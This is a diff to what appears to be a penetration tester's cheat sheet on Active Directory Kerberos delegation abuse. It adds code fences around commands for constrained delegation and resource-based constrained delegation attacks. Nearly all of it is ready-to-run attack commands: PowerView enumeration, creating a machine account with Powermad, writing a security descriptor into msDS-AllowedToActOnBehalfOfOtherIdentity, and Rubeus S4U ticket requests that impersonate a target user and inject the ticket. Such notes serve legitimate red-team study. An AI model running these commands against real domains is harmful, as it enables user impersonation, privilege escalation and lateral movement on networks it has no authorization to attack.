@@ -33,16 +33,22 @@ Domain Controller responds with TGS of target user for Service B - this TGS can 
 
 ## Commands
 - check allowed SPNs
+```
 Get-DomainUser <attackerComputerA> -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
+```
 
 - if SPN already contains cifs or desired service as SPN
+```
 [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
 $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<targetUser>')
 $idToImpersonate.Impersonate()
 [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+```
 
 - otherwise ask for TGS and insert alternative service
+```
 Invoke-Rubeus -Command 's4u /user:<attackerComputerA> /rc4:<ntlmHashComputerA> /impersonateuser:<targetUser> /msdsspn:"<service>/<fqdnTargetComputerB>" /altservice:cifs /ptt'
+```
 
 
 # Resource Based Constrained Delegation
@@ -58,33 +64,51 @@ Domain Controller responds with TGS of target user for Service A - this TGS can 
 
 ## Commands
 - check machine account quota (powerview)
+```
 Get-DomainObject -Domain <domain> -Properties ms-ds-machineaccountquota | Select -First 1
+```
 
 - check DC OS
+```
 Get-NetDomainController | Select name,osversion | Format-List
+```
 
 - check present SPN in msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+```
 Get-NetComputer <targetComputer> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+```
 
 - add new computer to domain if necessary (powermad)
+```
 New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newComputerPassword>' -AsPlainText -Force)
+```
 
 - get SID of new computer
+```
 Get-NetComputer <newComputer> -Properties objectsid | Select -Expand objectsid
+```
 
 - create a raw security descriptor for the new computer
+```
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<newComputerSid>)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
+```
 
 - add new value to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+```
 Get-NetComputer <targetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
 
 - check added msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+```
 Get-NetComputer <targetComputer> -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
 
 - ask for TGS
+```
 Invoke-Rubeus -Command 's4u /user:<newComputer> /rc4:<newComputerNtlmHash> /impersonateuser:<targetUser> /msdsspn:cifs/<fqdnTargetComputerB> /ptt'
+```
 
 # S4U2Proxy
 The service-for-User-to-Proxy extension works for resource-based constrained delegation even if the provided TGS of the user is not forwardable (design error of microsoft).
